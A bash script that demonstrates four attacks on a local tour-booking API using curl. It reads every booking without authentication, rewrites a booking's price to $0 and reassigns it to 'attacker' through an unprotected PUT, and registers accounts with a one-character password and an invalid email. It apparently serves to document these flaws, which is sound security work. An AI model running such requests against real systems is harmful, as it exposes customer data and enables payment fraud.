#!/bin/bash
# V-13 attack demonstration - raw curl commands, nothing hidden.
# Run with the server up:   bash scripts/attack.sh
API=http://localhost:4000
RUN=$(date +%s)   # unique suffix so repeat runs are not blocked by duplicate emails

# Seed one realistic booking so attack 1 has something to expose.
curl -s -o /dev/null -X POST $API/api/Booking -H "Content-Type: application/json" \
  -d '{"name":"Nimal Perera","booking_type":"hotel","booking_date":"2026-03-01","booking_time":"09:00","start_date":"2026-03-05","end_date":"2026-03-09","mobile_number":771112223,"payID":"p0","tourID":"t0","payment_amount":420,"touristID":"real-customer","B_Id":"b1"}' 2>/dev/null

echo ""
echo "############################################################"
echo "#  ATTACK 1 - Read every customer booking with no login    #"
echo "############################################################"
echo ""
echo "\$ curl $API/api/Booking"
echo ""
curl -s $API/api/Booking | head -c 600
echo ""
echo ""
echo -n ">>> HTTP status: "
curl -s -o /dev/null -w "%{http_code}\n" $API/api/Booking

echo ""
echo "############################################################"
echo "#  ATTACK 2 - Change a \$349 booking to \$0                  #"
echo "############################################################"
echo ""
echo "--- Step 1: create a normal booking (price 349) ---"
BOOKING=$(curl -s -X POST $API/api/Booking -H "Content-Type: application/json" \
  -d '{"name":"Sigiriya Tour","booking_type":"hotel","booking_date":"2026-02-01","booking_time":"10:00","start_date":"2026-02-10","end_date":"2026-02-15","mobile_number":771234567,"payID":"p1","tourID":"t1","payment_amount":349,"touristID":"real-customer","B_Id":"b1"}')
ID=$(echo "$BOOKING" | sed -n 's/.*"bookingID":"\([^"]*\)".*/\1/p')

if [ -z "$ID" ]; then
  echo ">>> Could not create booking. Server response:"
  echo "$BOOKING" | head -c 300
  echo ""
else
  echo "    bookingID      = $ID"
  echo "    payment_amount = $(curl -s $API/api/Booking/$ID | sed -n 's/.*"payment_amount":\([0-9]*\).*/\1/p')"
  echo "    touristID      = $(curl -s $API/api/Booking/$ID | sed -n 's/.*"touristID":"\([^"]*\)".*/\1/p')"
  echo ""
  echo "--- Step 2: THE ATTACK ---"
  echo ""
  echo "\$ curl -X PUT $API/api/Booking/$ID \\"
  echo "    -d '{\"payment_amount\":0,\"touristID\":\"attacker\"}'"
  echo ""
  curl -s -o /dev/null -X PUT $API/api/Booking/$ID -H "Content-Type: application/json" \
    -d '{"payment_amount":0,"touristID":"attacker"}'
  echo "--- Step 3: what the database says now ---"
  echo "    payment_amount = $(curl -s $API/api/Booking/$ID | sed -n 's/.*"payment_amount":\([0-9]*\).*/\1/p')   <-- was 349"
  echo "    touristID      = $(curl -s $API/api/Booking/$ID | sed -n 's/.*"touristID":"\([^"]*\)".*/\1/p')   <-- was real-customer"
fi

echo ""
echo "############################################################"
echo "#  ATTACK 3 - Register with a 1-character password         #"
echo "############################################################"
echo ""
echo "(the React form requires 8+ characters)"
echo ""
echo "\$ curl -X POST $API/api/touristregister -d '{... \"password\":\"1\" ...}'"
echo ""
curl -s -X POST $API/api/touristregister -H "Content-Type: application/json" \
  -d "{\"fullname\":\"Weak Password\",\"email\":\"weak-demo-$RUN@test.com\",\"password\":\"1\",\"country\":\"LK\",\"mobile_number\":\"0771234567\"}" \
  -w "\n>>> HTTP status: %{http_code}\n" | head -c 400

echo ""
echo "############################################################"
echo "#  ATTACK 4 - Register with an invalid email               #"
echo "############################################################"
echo ""
echo "\$ curl -X POST $API/api/touristregister -d '{... \"email\":\"this-is-not-an-email\" ...}'"
echo ""
curl -s -o /dev/null -X POST $API/api/touristregister -H "Content-Type: application/json" \
  -d "{\"fullname\":\"Bad Email\",\"email\":\"this-is-not-an-email-$RUN\",\"password\":\"password123\",\"country\":\"LK\",\"mobile_number\":\"0771234567\"}" \
  -w ">>> HTTP status: %{http_code}\n"
echo ""
